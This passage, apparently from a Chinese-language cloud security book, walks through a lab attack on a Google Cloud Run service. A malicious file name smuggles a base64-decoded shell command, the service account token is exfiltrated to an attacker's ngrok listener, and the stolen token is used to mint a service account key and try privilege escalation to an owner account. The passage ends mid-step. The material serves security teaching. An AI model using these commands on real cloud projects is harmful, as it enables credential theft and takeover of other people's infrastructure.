

`--` 告诉 `touch` 命令停止将后续参数解释为选项，即使它们以连字符 (`-`) 开头。当你的文件名包含特殊字符，例如分号或连字符时，这很有用，这些字符可能会使命令混淆或触发意外行为。

### Caution

如果你停止并重新启动你的 `ngrok` 隧道，下次启动时生成的子域名将会改变。这意味着你必须使用新的子域名更新 gist 脚本，使用 TinyURL 创建一个新的缩短 URL，并重复所有之前的步骤——包括生成编码后的有效载荷并使用恶意文件名创建新文件。

14. 指定文件将被上传到的 Cloud Storage 存储桶：

```
INPUT_BUCKET="[SPECIFY CLOUD STORAGE BUCKET]"
```

确保 `INPUT_BUCKET` 的值与配置了事件触发器的 Cloud Storage 存储桶的实际名称完全匹配。当有新文件上传时，该存储桶将调用 Cloud Run 服务。^([11](#ch10.html#id886))

15. 将文件上传到指定的 Cloud Storage 存储桶：^([12](#ch10.html#id887))

```
gsutil cp -- "$FILENAME" gs://$INPUT_BUCKET/
```

这会产生以下输出：

```
Copying file://index.html; echo ... | base64 -d | bash #.html
[Content-Type=text/html]...
- [1 files][   21.0 B/   21.0 B]
Operation completed over 1 objects/21.0 B.
```

### Caution

在执行 `gsutil` 命令之前，请确保请求接收器 Flask 服务器和 `ngrok` 隧道都在运行。

16. 文件上传后几秒钟，你应该会在本地机器的终端中看到包含 Cloud Run 服务使用的服务账号访问令牌的 JSON 对象：

```
{"access_token":"...","expires_in":741,"token_type":"Bearer"}
```

17. 从此 JSON 对象中复制 `access_token` 的值。

18. 在攻击者账号的 CloudShell 终端中，将访问令牌存储在变量中：

```
ACCESS_TOKEN="[ACCESS TOKEN]"
```

确保将 `[ACCESS TOKEN]` 替换为实际的访问令牌值。

运行以下命令列出可通过访问令牌访问的所有项目：

```
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    https://cloudresourcemanager.googleapis.com/v1/projects
```

这会给出以下 JSON 输出：

```
{
  "projects": [
    {
      "projectNumber": "...",
      "projectId": "...",
      "lifecycleState": "ACTIVE",
      "name": "...",
      "createTime": "..."
    }
  ]
}
```

请注意 JSON 响应中的项目编号值，因为它将在下一步中使用。^([13](#ch10.html#id888))

19. 从上一步复制项目 ID 和项目编号，并分别存储在 `PROJECT_ID` 和 `PROJECT_NUMBER` 变量中：

```
PROJECT_ID="[PROJECT ID]"
PROJECT_NUMBER="[PROJECT NUMBER]"
```

在执行命令之前，请确保将 `[PROJECT ID]` 和 `[PROJECT NUMBER]` 替换为其实际值。

20. 列出该项目的 Cloud Storage 存储桶：^([14](#ch10.html#id889))

```
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_NUMBER"
```

你应该得到以下 JSON 响应：

```
{
  "kind": "storage#buckets",
  "items": [
    ...
    {
      "kind": "storage#bucket",
      "selfLink": "...",
      "id": "ss-another-bucket-...",
      "name": "ss-another-bucket-...",
      "projectNumber": "...",
      "generation": "...",

      ...
    }
    ...
  ]
}
```

21. 通过查询令牌信息端点来验证访问令牌的详细信息：

```
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$ACCESS_TOKEN"
```

这会返回类似以下的 JSON 输出：

```
{
  "azp": "...",
  "aud": "...",
  "scope": "https://www.googleapis.com/auth/youtube ...",
  "exp": "...",
  "expires_in": "732",
  "email": "html-to-pdf@....iam.gserviceaccount.com",
  "email_verified": "true",
  "access_type": "online"
}
```

22. 从上一步复制服务账号电子邮件地址并将其存储在 `SA_EMAIL` 变量中：^([15](#ch10.html#id890))

```
SA_EMAIL="[EMAIL ADDRESS]"
```

23. 生成新的服务账号密钥然后将其保存到本地：^([16](#ch10.html#id891))

```
cd ~

BASE_URL="https://iam.googleapis.com/v1"
PROJECT_PATH="projects/$PROJECT_ID"
SERVICE_ACCOUNT="serviceAccounts/$SA_EMAIL"

curl -s -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "$BASE_URL/$PROJECT_PATH/$SERVICE_ACCOUNT/keys" \
  -d '{}' \
  | jq -r '.privateKeyData' | base64 --decode > run-key.json
```

24. 检查 `run-key.json` 文件的内容：

```
cat run-key.json
```

这会产生以下输出：

```
{
  "type": "service_account",
  "project_id": "...",
  "private_key_id": "...",
  "private_key": "...",
  "client_email": "html-to-pdf@....iam.gserviceaccount.com",
  "client_id": "...",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/...",
  "client_x509_cert_url": "https://www.googleapis.com/...",
  "universe_domain": "googleapis.com"
}
```

25. 使用 `run-key.json` 文件以受损 Cloud Run 服务使用的服务账号身份进行身份验证：

```
export RUN_KEY_CREDENTIALS="run-key.json"
gcloud auth activate-service-account \
  --key-file=$RUN_KEY_CREDENTIALS
```

这会产生以下输出：

```
Activated service account credentials for:
 [html-to-pdf@....iam.gserviceaccount.com]
```

26. 将当前的 `gcloud` 项目设置为 `run-key.json` 中指定的项目：

```
PROJECT_ID=$(cat run-key.json | jq -r ".project_id")
gcloud config set project $PROJECT_ID
```

你应该得到以下确认消息：

```
Updated property [core/project].
```

27. 列出当前 Google Cloud 项目中的所有服务账号：

```
gcloud iam service-accounts list
```

这会给出一个服务账号列表——包括一个电子邮件地址以 `superadmin` 开头的服务账号：

```
...

DISPLAY NAME: Cloud Run HTML to PDF Service Account
EMAIL: html-to-pdf@....iam.gserviceaccount.com
DISABLED: False

DISPLAY NAME: superadmin
EMAIL: superadmin@....iam.gserviceaccount.com
DISABLED: False

...
```

28. 复制以 `superadmin` 开头的服务账号的电子邮件地址并将其存储在 `EMAIL` 变量中：

```
EMAIL="[EMAIL ADDRESS]"
```

29. 检查电子邮件地址以 `superadmin` 开头的服务账号分配的 IAM 角色：

```
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:$EMAIL"
```

这会返回以下响应：

```
ROLE: roles/owner
```

30. 尝试冒充与 `roles/owner` 角色关联的服务账号：

```
gcloud iam service-accounts keys create ~/superadmin-key.json \
  --iam-account=$EMAIL \
  --impersonate-service-account=$EMAIL
```

这会产生以下错误消息：

